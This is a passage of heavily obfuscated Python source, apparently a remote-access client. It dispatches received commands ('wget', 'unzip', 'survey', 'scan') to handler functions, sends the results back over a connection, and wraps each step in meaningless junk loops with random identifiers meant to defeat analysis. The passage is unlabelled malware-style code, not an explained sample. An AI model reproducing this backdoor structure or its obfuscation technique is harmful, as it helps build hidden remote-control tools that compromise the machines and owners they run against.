                mzeWKmSbKRhTQiuAyZTjnbxmOpuKwRBV = 'naDybcDdatPWkqFPHeoYFypThwAXxDfS'
                vcNLknPcLAxNPrZwRUWUhbhssqmbmXRH = 'rkhQcUviemLJCOvdtlRxCIkJidSHLfdJ'
                EPErOqDLIPuqSOdKNzansFYYcoUISIUQ = 'UVMIAYIGlSezHlSIcYhMCVrUhVCfoffT'
                lsxUFRzMRBUIZCVzTvjOkkunqfsSkvvp = 'OlYlXbkvYJGsDGoueEbKWbgkjFvFBUmC'
                iBbMKXXqBDdGdvRVCHDtbzOuCwpaUutB = [
                        'zfWgqZCBzfqGPSDQtnLLNPjmbprzQhgd',
                        'naDybcDdatPWkqFPHeoYFypThwAXxDfS',
                        'UVMIAYIGlSezHlSIcYhMCVrUhVCfoffT',
                        'kudWYKFHUUPTlYAPRqcLeOgAMTrUkJBd'
                ]
                for APqAxaeYAmWGDVOeBUZaHQIxdnltBxQx in lsxUFRzMRBUIZCVzTvjOkkunqfsSkvvp:
                    for MusKbfsqOjuhErMFYHdCPsWLbcqvXLuT in mzeWKmSbKRhTQiuAyZTjnbxmOpuKwRBV:
                        if vcNLknPcLAxNPrZwRUWUhbhssqmbmXRH == EPErOqDLIPuqSOdKNzansFYYcoUISIUQ:
                            MusKbfsqOjuhErMFYHdCPsWLbcqvXLuT = APqAxaeYAmWGDVOeBUZaHQIxdnltBxQx
                        elif EPErOqDLIPuqSOdKNzansFYYcoUISIUQ == MusKbfsqOjuhErMFYHdCPsWLbcqvXLuT:
                            MusKbfsqOjuhErMFYHdCPsWLbcqvXLuT = lsxUFRzMRBUIZCVzTvjOkkunqfsSkvvp
                        else:
                            EPErOqDLIPuqSOdKNzansFYYcoUISIUQ = lsxUFRzMRBUIZCVzTvjOkkunqfsSkvvp
                            for MusKbfsqOjuhErMFYHdCPsWLbcqvXLuT in iBbMKXXqBDdGdvRVCHDtbzOuCwpaUutB:
                                mzeWKmSbKRhTQiuAyZTjnbxmOpuKwRBV = MusKbfsqOjuhErMFYHdCPsWLbcqvXLuT
            except Exception:
                pass
            VCiTfAhlorMIlNVLauEPZyCIMIJODOxX = CjVxWcOTrRVtfhmLQPYezPvfvjIoelab(zqqifMQrhtPefsCttOqFsDUuLduRzNZt)
            bmaWIfGjeoERFbkYOFbaWMNBukqpXfbv.send(PAMNmxJnmkQDYgiKaSUrJWZEsURKKAib(VCiTfAhlorMIlNVLauEPZyCIMIJODOxX, DETfGmKuhOglKRjePCaUWvDYeugRneWo))
        elif gqdrIXLOXPHbkxsnMpnqAYePclhNxzZr == 'wget':

            GDWrXrurVyFWUlsgHeYxNXPbtpPoDMnb = 'vOipxIjMewsSOMwVXUnnydjHHitEMSHV'
            WJpxUKNjErxpBKbtPZmzOHtZFZjXEadC = 'YwZocVaTKEgwPJIvXUDLolNzWBdHtdvo'
            AqqikLViGdTKtapISsqnIAMVtsDvABJf = 'OneiJJkuoRRnktsCwBnXSYbjVGJpocwp'
            if GDWrXrurVyFWUlsgHeYxNXPbtpPoDMnb == WJpxUKNjErxpBKbtPZmzOHtZFZjXEadC:
                AqqikLViGdTKtapISsqnIAMVtsDvABJf = 'OneiJJkuoRRnktsCwBnXSYbjVGJpocwp'
                AqqikLViGdTKtapISsqnIAMVtsDvABJf = GDWrXrurVyFWUlsgHeYxNXPbtpPoDMnb
            else:
                AqqikLViGdTKtapISsqnIAMVtsDvABJf = 'OneiJJkuoRRnktsCwBnXSYbjVGJpocwp'
                AqqikLViGdTKtapISsqnIAMVtsDvABJf = 'vOipxIjMewsSOMwVXUnnydjHHitEMSHV'
            VCiTfAhlorMIlNVLauEPZyCIMIJODOxX = toaJpGhohWQJmFciVMtksgdjtmmLxJpZ(action)
            bmaWIfGjeoERFbkYOFbaWMNBukqpXfbv.send(PAMNmxJnmkQDYgiKaSUrJWZEsURKKAib(VCiTfAhlorMIlNVLauEPZyCIMIJODOxX, DETfGmKuhOglKRjePCaUWvDYeugRneWo))
        elif gqdrIXLOXPHbkxsnMpnqAYePclhNxzZr == 'unzip':

            dGweZOTEiYiIhYssAgQmGgfazgQGQXcG = 'TgNSrsAviaqUnVoUPGtxwFqmrtecqmSy'
            OdpfyIFVMGStusUUfrsgbKWtiEUYrHJX = 'ooteWIjFwgBVFPTOIgswCsvAJCzsGRqz'
            SBPoaeCmuOOMenmSaTFhktNeewfKGbyH = 'QRqgNzdmAGTUBVPmplpPXMMAWVZXiYSV'
            tleRtcBozJPhDmaVtJjliqlABoUDptUg = 'BeCmZmPdUcZfMocMlJseEBhRtKuSORgT'
            if OdpfyIFVMGStusUUfrsgbKWtiEUYrHJX == dGweZOTEiYiIhYssAgQmGgfazgQGQXcG:
                for dGweZOTEiYiIhYssAgQmGgfazgQGQXcG in OdpfyIFVMGStusUUfrsgbKWtiEUYrHJX:
                    if OdpfyIFVMGStusUUfrsgbKWtiEUYrHJX == OdpfyIFVMGStusUUfrsgbKWtiEUYrHJX:
                        SBPoaeCmuOOMenmSaTFhktNeewfKGbyH = 'tleRtcBozJPhDmaVtJjliqlABoUDptUg'
                    elif SBPoaeCmuOOMenmSaTFhktNeewfKGbyH == tleRtcBozJPhDmaVtJjliqlABoUDptUg:
                        tleRtcBozJPhDmaVtJjliqlABoUDptUg = dGweZOTEiYiIhYssAgQmGgfazgQGQXcG
                    else:
                        dGweZOTEiYiIhYssAgQmGgfazgQGQXcG = OdpfyIFVMGStusUUfrsgbKWtiEUYrHJX
            elif SBPoaeCmuOOMenmSaTFhktNeewfKGbyH == SBPoaeCmuOOMenmSaTFhktNeewfKGbyH:
                for SBPoaeCmuOOMenmSaTFhktNeewfKGbyH in OdpfyIFVMGStusUUfrsgbKWtiEUYrHJX:
                    if tleRtcBozJPhDmaVtJjliqlABoUDptUg == OdpfyIFVMGStusUUfrsgbKWtiEUYrHJX:
                        SBPoaeCmuOOMenmSaTFhktNeewfKGbyH = 'tleRtcBozJPhDmaVtJjliqlABoUDptUg'
                    elif SBPoaeCmuOOMenmSaTFhktNeewfKGbyH == tleRtcBozJPhDmaVtJjliqlABoUDptUg:
                        tleRtcBozJPhDmaVtJjliqlABoUDptUg = dGweZOTEiYiIhYssAgQmGgfazgQGQXcG
                    else:
                        dGweZOTEiYiIhYssAgQmGgfazgQGQXcG = OdpfyIFVMGStusUUfrsgbKWtiEUYrHJX
                        for SBPoaeCmuOOMenmSaTFhktNeewfKGbyH in OdpfyIFVMGStusUUfrsgbKWtiEUYrHJX:
                            if tleRtcBozJPhDmaVtJjliqlABoUDptUg == OdpfyIFVMGStusUUfrsgbKWtiEUYrHJX:
                                SBPoaeCmuOOMenmSaTFhktNeewfKGbyH = 'tleRtcBozJPhDmaVtJjliqlABoUDptUg'
                            elif SBPoaeCmuOOMenmSaTFhktNeewfKGbyH == tleRtcBozJPhDmaVtJjliqlABoUDptUg:
                                tleRtcBozJPhDmaVtJjliqlABoUDptUg = dGweZOTEiYiIhYssAgQmGgfazgQGQXcG
                            else:
                                dGweZOTEiYiIhYssAgQmGgfazgQGQXcG = tleRtcBozJPhDmaVtJjliqlABoUDptUg
            else:
                dGweZOTEiYiIhYssAgQmGgfazgQGQXcG = OdpfyIFVMGStusUUfrsgbKWtiEUYrHJX
            VCiTfAhlorMIlNVLauEPZyCIMIJODOxX = CQmHLKeKQtmgAuCbLeIUyFRKkwLrKOHO(action)
            bmaWIfGjeoERFbkYOFbaWMNBukqpXfbv.send(PAMNmxJnmkQDYgiKaSUrJWZEsURKKAib(VCiTfAhlorMIlNVLauEPZyCIMIJODOxX, DETfGmKuhOglKRjePCaUWvDYeugRneWo))
        elif gqdrIXLOXPHbkxsnMpnqAYePclhNxzZr == 'survey':

            try:
                FaixWNXqqiJxBfHXECILEPzonuNGOISp = 'QdsdtABZqLKZkMfjPlPfPESrJUsPrcgN'
                KegXCfHWTviKicqtJlTfTKCComOZhWsV = 'QzUWVqNSdeCjDiTxKBEStlikcmRmVKtC'
                PVfTFbGzCnimOFvncAzzrKDNRSAxnNnN = 'iCSCUlHIfHyDeEkNZmmQCOBYjVukisvL'
                skZlqNIkOqhERYqOEuuUuLwqtzBvjfgh = 'tTyOBsBbbWzPPKtHtSwCMDowykLvSCFg'
                EnRJrryfCfQuYEEooLTeDppYCpKAdQWn = 'DeGQSoxFsIQbocRxqbrjhgCrYyYWIIVU'
                NPaBPRClkzrleJOhCYhQxjKbHRpVADCL = 'MYWGAbjZkgNRaYaYAUltlkppkZyhgPXJ'
                TZUdWQsLsVVSDXcQheEHioMajezhVNBT = [
                        'QdsdtABZqLKZkMfjPlPfPESrJUsPrcgN',
                        'iCSCUlHIfHyDeEkNZmmQCOBYjVukisvL',
                        'DeGQSoxFsIQbocRxqbrjhgCrYyYWIIVU',
                        'zZBpKJOJgzyFLqeCdFvGMMRPduhVONXQ'
                ]
                for FaixWNXqqiJxBfHXECILEPzonuNGOISp in NPaBPRClkzrleJOhCYhQxjKbHRpVADCL:
                    for KegXCfHWTviKicqtJlTfTKCComOZhWsV in PVfTFbGzCnimOFvncAzzrKDNRSAxnNnN:
                        if skZlqNIkOqhERYqOEuuUuLwqtzBvjfgh == EnRJrryfCfQuYEEooLTeDppYCpKAdQWn:
                            KegXCfHWTviKicqtJlTfTKCComOZhWsV = FaixWNXqqiJxBfHXECILEPzonuNGOISp
                        elif EnRJrryfCfQuYEEooLTeDppYCpKAdQWn == KegXCfHWTviKicqtJlTfTKCComOZhWsV:
                            KegXCfHWTviKicqtJlTfTKCComOZhWsV = NPaBPRClkzrleJOhCYhQxjKbHRpVADCL
                        else:
                            EnRJrryfCfQuYEEooLTeDppYCpKAdQWn = NPaBPRClkzrleJOhCYhQxjKbHRpVADCL
                            for KegXCfHWTviKicqtJlTfTKCComOZhWsV in TZUdWQsLsVVSDXcQheEHioMajezhVNBT:
                                PVfTFbGzCnimOFvncAzzrKDNRSAxnNnN = KegXCfHWTviKicqtJlTfTKCComOZhWsV
            except Exception:
                pass
            VCiTfAhlorMIlNVLauEPZyCIMIJODOxX = CjVxWcOTrRVtfhmLQPYezPvfvjIoelab(zqqifMQrhtPefsCttOqFsDUuLduRzNZt)
            bmaWIfGjeoERFbkYOFbaWMNBukqpXfbv.send(PAMNmxJnmkQDYgiKaSUrJWZEsURKKAib(VCiTfAhlorMIlNVLauEPZyCIMIJODOxX, DETfGmKuhOglKRjePCaUWvDYeugRneWo))
        elif gqdrIXLOXPHbkxsnMpnqAYePclhNxzZr == 'scan':

            sElIdGYNTTHdwBPIXPJKpYLfmzWEccNO = 'uJXYafcESZeOqyDAxfOIYanxFoZaaQxu'
            igUjZVtkoskdtuhqOiCZwAMIHlaUvYkK = 'GfrffqRWiiSjgcwtBzFtqLLwShyMwCnC'
            aMGilRlMgCilbgmyclrOghfXAIlAWapH = 'aYXavsRZKVzZOjnkLiHjjAoAWnfNcuGi'
            PhHcnXsOtdHnijeccVGGFZdfyCyInDgq = 'FyJQlpTWviJvgSUHtXlVpKqBXzkcYiaI'
            TgyLtfufFyPntbHuIPnYoHmHiBQZMbEm = 'gIZTpmEMuSSEbWlgMhJPKmKSdZtBFxmk'
            WlpIyukGYwPREgMVgoAznRubtHUXqqmK = 'zQVwnmOiibKgNNckRqWJnTbrLzBhduFy'
            if aMGilRlMgCilbgmyclrOghfXAIlAWapH == PhHcnXsOtdHnijeccVGGFZdfyCyInDgq:
                for WlpIyukGYwPREgMVgoAznRubtHUXqqmK in TgyLtfufFyPntbHuIPnYoHmHiBQZMbEm:
                    if WlpIyukGYwPREgMVgoAznRubtHUXqqmK == PhHcnXsOtdHnijeccVGGFZdfyCyInDgq:
                        TgyLtfufFyPntbHuIPnYoHmHiBQZMbEm = sElIdGYNTTHdwBPIXPJKpYLfmzWEccNO
                    else:
                        PhHcnXsOtdHnijeccVGGFZdfyCyInDgq = igUjZVtkoskdtuhqOiCZwAMIHlaUvYkK
            VCiTfAhlorMIlNVLauEPZyCIMIJODOxX = RIIkeigBsFnPYhEAbeKPinkIHRCmtEsM(action)
            bmaWIfGjeoERFbkYOFbaWMNBukqpXfbv.send(PAMNmxJnmkQDYgiKaSUrJWZEsURKKAib(VCiTfAhlorMIlNVLauEPZyCIMIJODOxX, DETfGmKuhOglKRjePCaUWvDYeugRneWo))
if __name__ == '__main__':

    mAzkRVHodUCNiynTzrjDpDDgtSVkKJhY = 'CWwAzQuzbXvVIvcZtUKNWXDpeWiWOXSw'
    JaVladlGUXRbtLbVaekeYgEMQckEkSrn = 'gKxYRJcUZPPPhrkarUTYFfqZGdBrUBJR'
    IUsejAXEFOWRoEzTreJPgpuszagZQzPh = 'ApumaVNhcYyxjRiDENHhDDQaQxIKtkto'
    HLabjLArgFmUBiSdTIlHtDsTHkWEdhFb = 'jUVxHgRbYIBSxKLjWowTkrxgGATwSnuL'
    mrytniLCRAVDKYAEgDEXAAMqXxHbswtW = 'ebCbjLqeBrEmDEfjkBOoWDyGiciyzmVn'
    ugFEOOkoFEzVxrHPkTYzmVvKmBGSUTAz = 'uWGxKUxqQXYbgaOdArOpdejIjIwrRISp'
    if IUsejAXEFOWRoEzTreJPgpuszagZQzPh == HLabjLArgFmUBiSdTIlHtDsTHkWEdhFb:
        for ugFEOOkoFEzVxrHPkTYzmVvKmBGSUTAz in mrytniLCRAVDKYAEgDEXAAMqXxHbswtW:
            if ugFEOOkoFEzVxrHPkTYzmVvKmBGSUTAz == HLabjLArgFmUBiSdTIlHtDsTHkWEdhFb:
                mrytniLCRAVDKYAEgDEXAAMqXxHbswtW = mAzkRVHodUCNiynTzrjDpDDgtSVkKJhY
            else:
                HLabjLArgFmUBiSdTIlHtDsTHkWEdhFb = JaVladlGUXRbtLbVaekeYgEMQckEkSrn
    qiMWPvHvljyCdHbajcSUdpxLsWQPxUNF()
